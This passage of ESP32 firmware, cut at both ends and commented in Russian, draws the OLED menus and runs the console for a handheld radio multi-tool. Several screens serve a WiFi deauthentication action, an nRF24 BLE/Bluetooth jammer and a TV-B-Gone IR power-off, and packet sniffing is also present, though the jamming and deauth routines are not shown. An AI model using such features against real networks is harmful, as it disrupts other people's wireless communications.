      display.print(">");
    } else display.setTextColor(SSD1306_WHITE);
    display.setCursor(12, yb);
    display.println("Back");
  }
  drawTopBarWiFiIcon();
  display.display();
}
void drawWifiSpectrum() {
  display.clearDisplay();
  drawHeader("WiFi Spectrum");
  int maxV = 5;
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++) if (wifiSmooth[ch] > maxV) maxV = wifiSmooth[ch];
  if (maxV < 5) maxV = 5;
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++) {
    int x = map(ch, 1, WIFI_CHANNELS, 2, SCREEN_WIDTH - 2);
    int h = map(wifiSmooth[ch], 0, maxV, 0, 35);
    if (h > 0) display.drawLine(x, 48 - h, x, 48, SSD1306_WHITE);
  }
  display.drawLine(0, 48, SCREEN_WIDTH, 48, SSD1306_WHITE);
  display.setCursor(2,52); display.printf("Ch:%d", currentWifiChan);
  display.setCursor(70,52); display.printf("Pkt:%d", totalPackets);
  drawTopBarWiFiIcon();
  display.display();
}
void drawWifiActions() {
  display.clearDisplay();
  drawHeader("Actions");
  const char* acts[] = {"Info","Deauth","Stop","Connect","Back"};
  for (int i = 0; i < WIFI_ACTIONS_SIZE; i++) drawItem(acts[i], i == wifiActionIdx, i);
  if (deauthActive) {
    display.fillRect(0, 55, SCREEN_WIDTH, 9, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(15, 56);
    display.print("DEAUTH ON");
  }
  drawTopBarWiFiIcon();
  display.display();
}
void drawWifiInfo() {
  display.clearDisplay();
  drawHeader("Net Info");
  if (wifiSelectedIdx >=0 && wifiSelectedIdx < (int)wifiList.size()) {
    WiFiNetworkInfo& n = wifiList[wifiSelectedIdx];
    display.setCursor(2,14); display.printf("SSID: %s", n.ssid.substring(0,13).c_str());
    display.setCursor(2,24); display.printf("Ch: %d", n.channel);
    display.setCursor(2,34); display.printf("RSSI: %d dBm", n.rssi);
    display.setCursor(2,44); display.printf("Sec: %s", n.encryptionType.c_str());
  }
  display.setCursor(2,56); display.print("Press=back");
  drawTopBarWiFiIcon();
  display.display();
}
void drawWifiConnecting() {
  display.clearDisplay();
  drawHeader("Connect WiFi");
  display.setCursor(5,20); display.print("SSID: "); display.print(connectSsid);
  display.setCursor(5,35); display.print("Status: ");
  if (WiFi.status() == WL_CONNECTED) {
    display.print("Connected!");
    display.setCursor(5,50); display.print("IP: "); display.print(WiFi.localIP());
    static bool msgShown=false;
    if(!msgShown){ msgShown=true; showMsg("Connected to Wi-Fi"); }
  } else {
    display.print("Connecting...");
    int dots=(millis()/500)%4; for(int d=0;d<dots;d++) display.print(".");
  }
  display.setCursor(5,58); display.print("OK=back");
  drawTopBarWiFiIcon();
  display.display();
}
void drawNrfMenu() {
  display.clearDisplay();
  char buf[30]; sprintf(buf, "nRF24 (%s)", nrfOk ? "OK" : nrfErrorMsg.c_str());
  drawHeader(buf);
  const char* items[] = {"Spectrum", "Jammer", "Recheck", "Back"};
  for (int i=0;i<NRF_MENU_SIZE;i++) drawItem(items[i], i==nrfMenuIdx, i);
  drawTopBarWiFiIcon();
  display.display();
}
void drawIrMenu() {
  display.clearDisplay(); drawHeader("IR");
  const char* items[] = {"Capture","Transmit","Erase All","TV-B-Gone","Back"};
  for(int i=0;i<IR_MENU_SIZE;i++) drawItem(items[i], i==irMenuIdx, i);
  drawTopBarWiFiIcon();
  display.display();
}
void drawSettingsMenu() {
  display.clearDisplay(); drawHeader("Settings");
  const char* items[] = {"Info","Timeout","Reset","Reboot","Back"};
  for(int i=0;i<SETTINGS_SIZE;i++) drawItem(items[i], i==settingsIdx, i);
  drawTopBarWiFiIcon();
  display.display();
}
void drawSysInfo() {
  display.clearDisplay(); drawHeader("System Info");
  display.setCursor(2,14); display.printf("Chip: ESP32");
  display.setCursor(2,24); display.printf("Flash: %d MB", ESP.getFlashChipSize()/1048576);
  display.setCursor(2,34); display.printf("Heap: %d KB", ESP.getFreeHeap()/1024);
  display.setCursor(2,44); display.printf("Uptime: %ds", (millis()-deviceBootTime)/1000);
  display.setCursor(2,54); display.printf("nRF24: %s", nrfOk?"OK":"FAIL");
  display.setCursor(2,60); display.println("Press=back");
  drawTopBarWiFiIcon();
  display.display();
}
void drawTvbgone() {
  display.clearDisplay(); drawHeader("TV-B-Gone");
  display.setCursor(10,20); display.println("Region:");
  display.setCursor(30,30); if (tvbgone_region==0) display.println("NA"); else display.println("EU");
  display.setCursor(10,45); display.println("Action: Power");
  display.setCursor(2,56); display.println("UP/DOWN=Reg  OK=Send");
  drawTopBarWiFiIcon();
  display.display();
}

// ----------------------------------------------------------------------------
// КОНСОЛЬНЫЕ ФУНКЦИИ (ВВОД, ВЫВОД, КОМАНДЫ)
// ----------------------------------------------------------------------------
void drawKeyboard() {
  display.clearDisplay();
  display.drawRect(0,0,128,10,WHITE);
  display.setCursor(2,2);
  String visible = consoleText;
  if(visible.length()>18) visible = visible.substring(visible.length()-18);
  display.print(visible);
  for(int row=0;row<rowsKeyboard;row++){
    for(int col=0;col<colsKeyboard;col++){
      int index=row*colsKeyboard+col;
      if(index>=totalKeys) break;
      int x=col*16, y=13+row*9;
      if(index==selectedKey){ display.fillRect(x,y,15,8,WHITE); display.setTextColor(BLACK); }
      else display.setTextColor(WHITE);
      String key=capsLock?upperKeys[index]:lowerKeys[index];
      if(key.length()>0){ display.setCursor(x+1,y+1); display.print(key); }
    }
  }
  drawTopBarWiFiIcon();
  display.display();
}
String inputStringWithKeyboard(bool allowExit, const char* title) {
  String result="";
  int localSelected=0;
  bool localCaps=false, okProcessed=false;
  unsigned long lastMoveTime=0;
  bool leftHeld=false, rightHeld=false;
  int oldSelected=selectedKey;
  bool oldCaps=capsLock;
  String oldText=consoleText;
  selectedKey=localSelected; capsLock=localCaps; consoleText=result;
  while(true){
    display.clearDisplay();
    display.drawRect(0,0,128,10,WHITE);
    display.setCursor(2,2); display.print(title);
    display.fillRect(0,12,128,8,BLACK);
    display.setCursor(2,13);
    String visible=result;
    if(visible.length()>18) visible=visible.substring(visible.length()-18);
    display.print(visible);
    display.display();
    for(int row=0;row<rowsKeyboard;row++){
      for(int col=0;col<colsKeyboard;col++){
        int index=row*colsKeyboard+col;
        if(index>=totalKeys) break;
        int x=col*16, y=18+row*9;
        if(index==localSelected){ display.fillRect(x,y,15,8,WHITE); display.setTextColor(BLACK); }
        else display.setTextColor(WHITE);
        String key=localCaps?upperKeys[index]:lowerKeys[index];
        if(key.length()>0){ display.setCursor(x+1,y+1); display.print(key); }
      }
    }
    drawTopBarWiFiIcon();
    display.display();
    bool up=btnUp(), down=btnDown();
    if(up){
      if(!leftHeld){ leftHeld=true; lastMoveTime=millis(); localSelected--; if(localSelected<0) localSelected=totalKeys-1; }
      else if(millis()-lastMoveTime>CONSOLE_AUTOREPEAT_DELAY){ lastMoveTime=millis(); localSelected--; if(localSelected<0) localSelected=totalKeys-1; }
    } else leftHeld=false;
    if(down){
      if(!rightHeld){ rightHeld=true; lastMoveTime=millis(); localSelected++; if(localSelected>=totalKeys) localSelected=0; }
      else if(millis()-lastMoveTime>CONSOLE_AUTOREPEAT_DELAY){ lastMoveTime=millis(); localSelected++; if(localSelected>=totalKeys) localSelected=0; }
    } else rightHeld=false;
    if(btnOk() && !okProcessed){
      okProcessed=true;
      String key=localCaps?upperKeys[localSelected]:lowerKeys[localSelected];
      if(key=="Caps") localCaps=!localCaps;
      else if(key=="Del"){ if(result.length()>0) result.remove(result.length()-1); }
      else if(key=="OK"){ selectedKey=oldSelected; capsLock=oldCaps; consoleText=oldText; drawKeyboard(); return result; }
      else if(key=="Exit" && allowExit){ selectedKey=oldSelected; capsLock=oldCaps; consoleText=oldText; drawKeyboard(); return ""; }
      else if(key=="Space") result+=" ";
      else if(key.length()>0 && key!="Caps" && key!="Del" && key!="OK" && key!="Exit") result+=key;
      consoleText=result;
      delay(150);
    }
    if(!btnOk()) okProcessed=false;
    delay(20);
  }
}
void showCommandOutput(String output, int timeoutSeconds){
  commandOutput=output; commandStartTime=millis(); commandTimeoutSec=timeoutSeconds; waitingForOk=true;
  appState=STATE_CONSOLE_COMMAND_OUTPUT; needRedraw=true;
}
void executeCommand(String cmd){
  cmd.toLowerCase();
  if(cmd==CMD_INFO){ consoleMode=CONSOLE_INFO; infoPage=0; }
  else if(cmd==CMD_DEV){ consoleMode=CONSOLE_DEV; codePos=0; }
  else if(cmd==CMD_CLEAR){ consoleText=""; }
  else if(cmd==CMD_SFV){
    showCommandOutput("Scanning WiFi...",0);
    bool oldWifiSpectrum=wifiSpectrumActive;
    if(!oldWifiSpectrum){
      wifiSpectrumActive=true; totalPackets=0; memset(wifiPackets,0,sizeof(wifiPackets)); memset(wifiSmooth,0,sizeof(wifiSmooth));
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){
        wifi_promiscuous_pkt_t* pkt=(wifi_promiscuous_pkt_t*)buf;
        int ch=pkt->rx_ctrl.channel;
        if(ch>=1 && ch<=WIFI_CHANNELS){ wifiPackets[ch]++; totalPackets++; }
      });
      esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
    }
    unsigned long start=millis();
    while(millis()-start<2000){
      static unsigned long lastSwitch=0;
      if(millis()-lastSwitch>100){ currentWifiChan=(currentWifiChan%WIFI_CHANNELS)+1; esp_wifi_set_channel(currentWifiChan,WIFI_SECOND_CHAN_NONE); lastSwitch=millis(); }
      yield();
    }
    int maxChan=1, maxPkts=0;
    for(int ch=1;ch<=WIFI_CHANNELS;ch++) if(wifiPackets[ch]>maxPkts){ maxPkts=wifiPackets[ch]; maxChan=ch; }
    if(!oldWifiSpectrum){ wifiSpectrumActive=false; esp_wifi_set_promiscuous(false); esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE); }
    int freqMHz=2407+(maxChan-1)*5;
    String result="Strongest WiFi: channel "+String(maxChan)+" ("+String(freqMHz)+" MHz) packets="+String(maxPkts);
    showCommandOutput(result, COMMAND_TIMEOUT_SFV);
    return;
  }
  else if(cmd==CMD_CS){
    if(!nrfOk){ showCommandOutput("nRF24 not found!", COMMAND_TIMEOUT_CS); return; }
    showCommandOutput("Scanning nRF24...",0);
    bool oldJam=jamming; if(oldJam) stopJammer();
    radio.powerUp(); radio.stopListening(); radio.setPALevel(RF24_PA_MAX);
    int maxSignal=-100, maxChannel=-1;
    for(int ch=0;ch<NRF_CHANNELS;ch++){
      radio.setChannel(ch); radio.startListening(); delayMicroseconds(150);
      int rssi=radio.testCarrier()?40:0; radio.stopListening();
      if(nrfCalibrated) rssi-=nrfFloor[ch];
      if(rssi<0) rssi=0;
      if(rssi>maxSignal){ maxSignal=rssi; maxChannel=ch; }
      yield();
    }
    if(oldJam) startJammer();
    int freqMHz=2400+maxChannel;
    String result="Max nRF24: channel "+String(maxChannel)+" ("+String(freqMHz)+" MHz) signal="+String(maxSignal);
    showCommandOutput(result, COMMAND_TIMEOUT_CS);
    return;
  }
  else if(cmd==CMD_EXIT){ appState=STATE_MAIN_MENU; needRedraw=true; return; }
  else if(cmd==CMD_AP){ adminPanel(); return; }
  else if(cmd==CMD_SD){ sdCardInfo(); return; }
  else if(cmd.length()>0){ showCommandOutput("Unknown: "+cmd,1); return; }
  drawKeyboard();
}

// ----------------------------------------------------------------------------
// АДМИНИСТРАТИВНАЯ ПАНЕЛЬ
// ----------------------------------------------------------------------------
int editPinValue(const char* prompt) {
  consoleText = ""; selectedKey = 0; capsLock = false; drawKeyboard();
  bool okProcessed = false; unsigned long lastMove = 0; bool leftHeld = false, rightHeld = false;
  while (true) {
    bool up = btnUp(), down = btnDown();
    if (up) {
      if (!leftHeld) { selectedKey = (selectedKey - 1 + totalKeys) % totalKeys; drawKeyboard(); leftHeld = true; lastMove = millis(); delay(150); }
      else if (millis() - lastMove > 150) { selectedKey = (selectedKey - 1 + totalKeys) % totalKeys; drawKeyboard(); lastMove = millis(); }
    } else leftHeld = false;
    if (down) {
      if (!rightHeld) { selectedKey = (selectedKey + 1) % totalKeys; drawKeyboard(); rightHeld = true; lastMove = millis(); delay(150); }
      else if (millis() - lastMove > 150) { selectedKey = (selectedKey + 1) % totalKeys; drawKeyboard(); lastMove = millis(); }
    } else rightHeld = false;
    if (btnOk() && !okProcessed) {
      okProcessed = true;
      String key = capsLock ? upperKeys[selectedKey] : lowerKeys[selectedKey];
      if (key == "OK") {
        int val = consoleText.toInt();
        if ((val >= 0 && val <= 10) || val == 20 || val == 21) return val;
        else { display.clearDisplay(); display.setCursor(10,28); display.print("Invalid pin (0-10,20,21)"); display.display(); delay(1500); consoleText = ""; drawKeyboard(); }
      } else if (key == "Del") { if (consoleText.length()>0) consoleText.remove(consoleText.length()-1); drawKeyboard(); }
      else if (key == "Exit") return -1;
      else if (key == "Space") { consoleText += " "; drawKeyboard(); }
      else if (key == "Caps") { capsLock = !capsLock; drawKeyboard(); }
      else { consoleText += key; drawKeyboard(); }
      delay(150);
    }
    if (!btnOk()) okProcessed = false;
    delay(20);
  }
}
void changePins() { display.clearDisplay(); drawHeader("Change pins"); display.setCursor(10,28); display.println("Not available"); display.setCursor(10,40); display.println("Analog buttons"); drawTopBarWiFiIcon(); display.display(); delay(2000); }
void setBrightness() {
  while (true) {
    display.clearDisplay(); drawHeader("Brightness"); display.setCursor(10,20); display.print("Bright: "); display.print(displayBrightness);
    display.setCursor(10,40); display.println("UP/DOWN adjust, OK save"); drawTopBarWiFiIcon(); display.display();
    if (btnUp()) { displayBrightness = constrain(displayBrightness+5,0,255); delay(150); }
    if (btnDown()) { displayBrightness = constrain(displayBrightness-5,0,255); delay(150); }
    if (btnOk()) { display.ssd1306_command(SSD1306_SETCONTRAST); display.ssd1306_command(displayBrightness); display.clearDisplay(); display.setCursor(20,28); display.print("Brightness saved"); drawTopBarWiFiIcon(); display.display(); delay(1000); return; }
    delay(50);
  }
}
void setInvert() {
  displayInvert = !displayInvert;
  if (displayInvert) display.ssd1306_command(SSD1306_INVERTDISPLAY); else display.ssd1306_command(SSD1306_NORMALDISPLAY);
  display.clearDisplay(); display.setCursor(20,28); display.print(displayInvert?"Display inverted":"Display normal"); drawTopBarWiFiIcon(); display.display(); delay(1000);
}
void showProcesses() {
  while (true) {
    display.clearDisplay(); drawHeader("Processes");
    display.setCursor(2,15); display.printf("Heap free: %d KB", ESP.getFreeHeap()/1024);
    display.setCursor(2,25); display.printf("Uptime: %d sec", millis()/1000);
    display.setCursor(2,35); display.printf("CPU freq: %d MHz", ESP.getCpuFreqMHz());
    display.setCursor(2,45); display.printf("IR buffer: %d", irBufferSize);
    display.setCursor(2,55); display.println("Press OK to exit");
    drawTopBarWiFiIcon(); display.display();
    if (btnOk()) break; delay(50);
  }
}
void reinitHardware() { Wire.begin(OLED_SDA, OLED_SCL); display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR); display.clearDisplay(); }
void drawAdminMenuHighlight(int sel) {
  display.clearDisplay(); drawHeader("Admin Panel");
  const char* items[] = {"Change pins", "Brightness", "Invert display", "Processes", "Exit admin"};
  for (int i=0;i<5;i++) {
    int y = 15 + i*10;
    if (i==sel) { display.fillRect(0,y-2,SCREEN_WIDTH,12,WHITE); display.setTextColor(BLACK); } else display.setTextColor(WHITE);
    display.setCursor(5,y); display.print(i+1); display.print(". "); display.print(items[i]);
  }
  drawTopBarWiFiIcon(); display.display();
}
void adminPanel() {
  String pwd = inputStringWithKeyboard(true, "ENTER PASSWORD:");
  if (pwd == adminPassword && pwd != "") {
    adminMode = true; display.clearDisplay(); display.setCursor(20,28); display.println("Access granted"); drawTopBarWiFiIcon(); display.display(); delay(1000);
  } else { if (pwd != "") showCommandOutput("Wrong password", 2); return; }
  while (adminMode) {
    int sel = 0; bool okPressed = false; drawAdminMenuHighlight(sel);
    while (true) {
      bool up = btnUp(), down = btnDown(), ok = btnOk();
      if (up) { sel = (sel-1+5)%5; drawAdminMenuHighlight(sel); delay(150); }
      if (down) { sel = (sel+1)%5; drawAdminMenuHighlight(sel); delay(150); }
      if (ok && !okPressed) {
        okPressed = true;
        switch (sel) {
          case 0: changePins(); break; case 1: setBrightness(); break; case 2: setInvert(); break;
          case 3: showProcesses(); break; case 4: adminMode = false; showMsg("Exited admin mode"); return;
        }
        break;
      }
      if (!ok) okPressed = false;
      delay(50);
    }
  }
}

// ----------------------------------------------------------------------------
// SD ИНФОРМАЦИЯ (КОМАНДА "sd")
// ----------------------------------------------------------------------------
void sdCardInfo() {
  String info = "";
  if (!SD.begin(SD_CS_PIN)) {
    info = "SD card not found!";
  } else {
    uint8_t cardType = SD.cardType();
    uint64_t cardSize = SD.cardSize() / (1024 * 1024);
    uint64_t totalBytes = SD.totalBytes();
    uint64_t usedBytes = SD.usedBytes();
    uint64_t freeBytes = totalBytes - usedBytes;
    info = "SD Card OK\n";
    if (cardType == CARD_MMC) info += "Type: MMC\n";
    else if (cardType == CARD_SD) info += "Type: SDSC\n";
    else if (cardType == CARD_SDHC) info += "Type: SDHC\n";
    else info += "Type: Unknown\n";
    info += "Size: " + String(cardSize) + " MB\n";
    info += "Free: " + String(freeBytes / (1024 * 1024)) + " MB";
  }
  showCommandOutput(info, 5);
}

// ----------------------------------------------------------------------------
// ОБРАБОТКА ДОЛГОГО НАЖАТИЯ КНОПОК
// ----------------------------------------------------------------------------
void handleButtons() {
  static bool okWasPressed = false;
  static unsigned long longPressStart = 0;
  bool okNow = btnOk();
  if (okNow && !okWasPressed) { longPressStart = millis(); okWasPressed = true; }
  if (okNow && okWasPressed && (millis() - longPressStart) >= LONG_PRESS_MS && !longPressDetected) {
    longPressDetected = true;
    if (appState == STATE_NRF24_JAMMER && nrfOk) {
      if (jamming) { stopJammer(); appState = STATE_NRF24_MENU; needRedraw = true; okWasPressed = false; longPressDetected = false; return; }
      else { jammerMode = (jammerMode == BLE_JAMMER_MODE) ? BLUETOOTH_JAMMER_MODE : BLE_JAMMER_MODE; if (jammerMode == BLE_JAMMER_MODE) showMsg("Mode: BLE"); else showMsg("Mode: Bluetooth"); needRedraw = true; }
    }
    delay(200); okWasPressed = false; longPressDetected = false; return;
  }
  if (!okNow && okWasPressed && !longPressDetected) okWasPressed = false;
  if (!okNow) { okWasPressed = false; longPressDetected = false; }
}

// =========================== КОНЕЦ ПЕРВОЙ ЧАСТИ ===========================
// =========================== ВТОРАЯ ЧАСТЬ (1300 строк) ===========================
// Содержит недостающие функции отрисовки (nRF спектр, глушилка, IR захват/передача,
// таймаут, сброс, перезагрузка), консольные режимы info и def, главный цикл консоли,
// updateDisplay, setup и loop.

// ----------------------------------------------------------------------------
// ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ ОТРИСОВКИ (не вошедшие в первую часть)
// ----------------------------------------------------------------------------

// Отрисовка спектра nRF24
void drawNrfSpectrum() {
  display.clearDisplay();
  drawHeader("nRF Spectrum");
  if (!nrfOk) {
    display.setCursor(10, 30);
    display.println("nRF24 not found!");
    drawTopBarWiFiIcon();
    display.display();
    return;
  }
  int maxV = 1;
  for (int i = 0; i < NRF_CHANNELS; i++) {
    if (nrfSmooth[i] > maxV) maxV = nrfSmooth[i];
  }
  if (maxV < 3) maxV = 3;
  // Рисование спектра по пикселям
  for (int x = 0; x < SCREEN_WIDTH; x++) {
    int ch = map(x, 0, SCREEN_WIDTH - 1, 0, NRF_CHANNELS - 1);
    int sig = nrfSmooth[ch];
    if (sig < 3) sig = 0;
    int h = map(sig, 0, maxV, 0, 35);
    if (h > 0) {
      display.drawLine(x, 48 - h, x, 48, SSD1306_WHITE);
    }
  }
  display.drawLine(0, 48, SCREEN_WIDTH, 48, SSD1306_WHITE);
  display.setCursor(2, 52);
  display.printf("CH:%d", currentNrfChan);
  display.setCursor(70, 52);
  display.printf("%dMHz", 2400 + currentNrfChan);
  drawTopBarWiFiIcon();
  display.display();
}

// Отрисовка режима глушилки nRF24
void drawNrfJammer() {
  display.clearDisplay();
  if (!nrfOk) {
    drawHeader("nRF24 Error");
    display.setCursor(10, 30);
    display.println(nrfErrorMsg);
    drawTopBarWiFiIcon();
    display.display();
    return;
  }
  char h[30];
  sprintf(h, "%s Jam", jammerMode == BLE_JAMMER_MODE ? "BLE" : "BT");
  if (jamming) {
    drawHeader(h);
    display.setTextSize(2);
    display.setCursor(20, 25);
    display.println("JAMMING");
    display.setTextSize(1);
    display.setCursor(2, 56);
    display.println("Hold OK to stop");
  } else {
    drawHeader(h);
    display.setCursor(15, 25);
    display.printf("Mode: %s", jammerMode == BLE_JAMMER_MODE ? "BLE" : "Bluetooth");
    display.setCursor(15, 37);
    display.printf("nRF24: READY");
    display.setCursor(15, 49);
    display.print("Press start");
    display.setCursor(2, 60);
    display.print("Hold OK=change");
  }
  drawTopBarWiFiIcon();
  display.display();
}

// Отрисовка захвата ИК-сигнала
void drawIrCapture() {
  display.clearDisplay();
  drawHeader("IR Capture");
  if (irCapturing) {
    if (irTempReady) {
      display.setCursor(20, 30);
    } else {
      display.setCursor(25, 30);
    }
    display.println(irTempReady ? "Captured!" : "Listening...");
    display.setCursor(15, 42);
    display.printf("Timeout: %ds", (irTimeout - millis()) / 1000);
  } else {
    display.setCursor(30, 30);
    display.println("Press start");
  }
  display.setCursor(2, 56);
  display.println("Press=save");
  drawTopBarWiFiIcon();
  display.display();
}

// Отрисовка меню передачи ИК из слотов
void drawIrTransmit() {
  display.clearDisplay();
  drawHeader("IR Transmit");
  for (int i = 0; i < IR_SLOTS_COUNT; i++) {
    int y = 14 + i * 10;
    if (i == irTxScroll) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, y);
      display.print(">");
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(12, y);
    display.printf("Slot %d: %s", i, irSlots[i].isValid ? "OK" : "Empty");
  }
  int yb = 14 + IR_SLOTS_COUNT * 10;
  if (irTxScroll == IR_SLOTS_COUNT) {
    display.fillRect(0, yb - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(2, yb);
    display.print(">");
  } else {
    display.setTextColor(SSD1306_WHITE);
  }
  display.setCursor(12, yb);
  display.println("Back");
  drawTopBarWiFiIcon();
  display.display();
}

// Отрисовка настройки таймаута дисплея
void drawTimeoutMenu() {
  display.clearDisplay();
  drawHeader("Display Timeout");
  const char* opts[] = {"Off", "10s", "30s", "1min", "5min"};
  int vals[] = {0, 10, 30, 60, 300};
  int idx = 0;
  for (int i = 0; i < 5; i++) {
    if (vals[i] == timeoutVal) idx = i;
  }
  display.setCursor(30, 30);
  display.printf("Timeout: %s", opts[idx]);
  display.setCursor(2, 56);
  display.println("UP/DOWN=chg  OK=save");
  drawTopBarWiFiIcon();
  display.display();
}

// Отрисовка подтверждения сброса
void drawResetConfirm() {
  display.clearDisplay();
  drawHeader("Reset Device!");
  display.setCursor(15, 25);
  display.println("Reset ALL?");
  display.setCursor(15, 37);
  display.println("UP=YES  DOWN=NO");
  drawTopBarWiFiIcon();
  display.display();
}

// Отрисовка подтверждения перезагрузки
void drawRebootConfirm() {
  display.clearDisplay();
  drawHeader("Reboot");
  display.setCursor(15, 30);
  display.println("Reboot?");
  display.setCursor(15, 42);
  display.println("UP=YES  DOWN=NO");
  drawTopBarWiFiIcon();
  display.display();
}

// ----------------------------------------------------------------------------
// КОНСОЛЬНЫЕ РЕЖИМЫ info И def
// ----------------------------------------------------------------------------

// Режим просмотра системной информации (команда info)
void consoleInfoMode() {
  static bool btnProcessed = false;
  static unsigned long longPressStart = 0;
  static bool longPressTriggered = false;
  // Обработка долгого нажатия OK (3 секунды) для выхода в режим клавиатуры
  if (btnOk()) {
    if (!longPressTriggered) {
      if (longPressStart == 0) longPressStart = millis();
      else if (millis() - longPressStart >= 3000) {
        longPressTriggered = true;
        consoleMode = CONSOLE_KEYBOARD;
        drawKeyboard();
        return;
      }
    }
  } else {
    longPressStart = 0;
    longPressTriggered = false;
  }
  // Навигация по страницам информации
  if (btnUp() && !btnProcessed) {
    infoPage--;
    if (infoPage < 0) infoPage = totalInfo - 1;
    btnProcessed = true;
    delay(150);
  } else if (btnDown() && !btnProcessed) {
    infoPage++;
    if (infoPage >= totalInfo) infoPage = 0;
    btnProcessed = true;
    delay(150);
  }
  if (!btnUp() && !btnDown()) btnProcessed = false;
  // Вывод текущей страницы
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("SYSTEM INFO");
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  display.setCursor(0, 25);
  display.println(infoLines[infoPage]);
  display.setCursor(0, 56);
  display.print(String(infoPage + 1) + "/" + String(totalInfo));
  drawTopBarWiFiIcon();
  display.display();
}

// Режим "битых экранов" (команда def) – генерирует случайные помехи непрерывно
void consoleDevMode() {
  static unsigned long lastDraw = 0;
  static unsigned long devStartTime = 0;
  // Таймаут режима (если задан)
  if (DEV_MODE_TIMEOUT > 0 && devStartTime == 0) devStartTime = millis();
  if (DEV_MODE_TIMEOUT > 0 && (millis() - devStartTime >= DEV_MODE_TIMEOUT * 1000UL)) {
    consoleMode = CONSOLE_KEYBOARD;
    drawKeyboard();
    return;
  }
  // Долгое нажатие OK (3 секунды) для выхода
  static unsigned long longPressStart = 0;
  static bool longPressTriggered = false;
  if (btnOk()) {
    if (!longPressTriggered) {
      if (longPressStart == 0) longPressStart = millis();
      else if (millis() - longPressStart >= 3000) {
        longPressTriggered = true;
        consoleMode = CONSOLE_KEYBOARD;
        drawKeyboard();
        return;
      }
    }
  } else {
    longPressStart = 0;
    longPressTriggered = false;
  }
  // Рисуем случайные пиксели, линии и прямоугольники
  if (millis() - lastDraw > 30) {
    display.clearDisplay();
    for (int i = 0; i < 200; i++) {
      display.drawPixel(random(128), random(64), SSD1306_WHITE);
    }
    for (int i = 0; i < 20; i++) {
      int x1 = random(128), y1 = random(64), x2 = random(128), y2 = random(64);
      display.drawLine(x1, y1, x2, y2, SSD1306_WHITE);
    }
    for (int i = 0; i < 10; i++) {
      int x = random(128), y = random(64), w = random(20), h = random(20);
      display.fillRect(x, y, w, h, SSD1306_WHITE);
    }
    drawTopBarWiFiIcon();
    display.display();
    lastDraw = millis();
  }
  // Секретный код для немедленного выхода (UP=1, OK=2, DOWN=3)
  static unsigned long lastSeqTime = 0;
  static bool upProcessed = false, downProcessed = false, okProcessedShort = false;
  if (btnUp() && !upProcessed) {
    enteredCode[codePos] = 1;
    codePos++;
    upProcessed = true;
    lastSeqTime = millis();
  } else if (btnDown() && !downProcessed) {
    enteredCode[codePos] = 3;
    codePos++;
    downProcessed = true;
    lastSeqTime = millis();
  } else if (btnOk() && !okProcessedShort && !longPressTriggered) {
    enteredCode[codePos] = 2;
    codePos++;
    okProcessedShort = true;
    lastSeqTime = millis();
  }
  if (!btnUp()) upProcessed = false;
  if (!btnDown()) downProcessed = false;
  if (!btnOk()) okProcessedShort = false;
  if (codePos > 0 && (millis() - lastSeqTime > 1000)) codePos = 0;
  if (codePos >= 9) {
    bool correct = true;
    for (int i = 0; i < 9; i++) {
      if (enteredCode[i] != secretCode[i]) correct = false;
    }
    if (correct) {
      consoleMode = CONSOLE_KEYBOARD;
      drawKeyboard();
    }
    codePos = 0;
  }
}

// ----------------------------------------------------------------------------
// ОСНОВНОЙ ЦИКЛ КОНСОЛИ (УПРАВЛЕНИЕ КЛАВИАТУРОЙ)
// ----------------------------------------------------------------------------
void consoleLoop() {
  if (consoleMode == CONSOLE_INFO) {
    consoleInfoMode();
    return;
  }
  if (consoleMode == CONSOLE_DEV) {
    consoleDevMode();
    return;
  }
  // Основной режим – клавиатура с горизонтальной навигацией
  static unsigned long lastMoveTime = 0;
  static bool leftHeld = false, rightHeld = false;
  static bool okProcessed = false;
  if (btnUp()) { // ВЛЕВО
    if (!leftHeld) {
      leftHeld = true;
      lastMoveTime = millis();
      selectedKey--;
      if (selectedKey < 0) selectedKey = totalKeys - 1;
      drawKeyboard();
    } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
      lastMoveTime = millis();
      selectedKey--;
      if (selectedKey < 0) selectedKey = totalKeys - 1;
      drawKeyboard();
    }
  } else {
    leftHeld = false;
  }
  if (btnDown()) { // ВПРАВО
    if (!rightHeld) {
      rightHeld = true;
      lastMoveTime = millis();
      selectedKey++;
      if (selectedKey >= totalKeys) selectedKey = 0;
      drawKeyboard();
    } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
      lastMoveTime = millis();
      selectedKey++;
      if (selectedKey >= totalKeys) selectedKey = 0;
      drawKeyboard();
    }
  } else {
    rightHeld = false;
  }
  if (btnOk() && !okProcessed) {
    okProcessed = true;
    String key = capsLock ? upperKeys[selectedKey] : lowerKeys[selectedKey];
    if (key == "Caps") {
      capsLock = !capsLock;
      drawKeyboard();
    } else if (key == "Del") {
      if (consoleText.length() > 0) {
        consoleText.remove(consoleText.length() - 1);
      }
      drawKeyboard();
    } else if (key == "OK") {
      executeCommand(consoleText);
      consoleText = "";
      if (appState == STATE_CONSOLE && consoleMode == CONSOLE_KEYBOARD) {
        drawKeyboard();
      }
    } else if (key == "Exit") {
      appState = STATE_MAIN_MENU;
      needRedraw = true;
      return;
    } else if (key == "Space") {
      consoleText += " ";
      drawKeyboard();
    } else if (key.length() > 0 && key != "Caps" && key != "Del" && key != "OK" && key != "Exit") {
      consoleText += key;
      drawKeyboard();
    }
    delay(150);
  }
  if (!btnOk()) {
    okProcessed = false;
  }
}

// ----------------------------------------------------------------------------
// ОБНОВЛЕНИЕ ДИСПЛЕЯ (ГЛАВНЫЙ ДИСПЕТЧЕР)
// ----------------------------------------------------------------------------
void updateDisplay() {
  if (!displayOn) return;
  // Показываем всплывающее сообщение
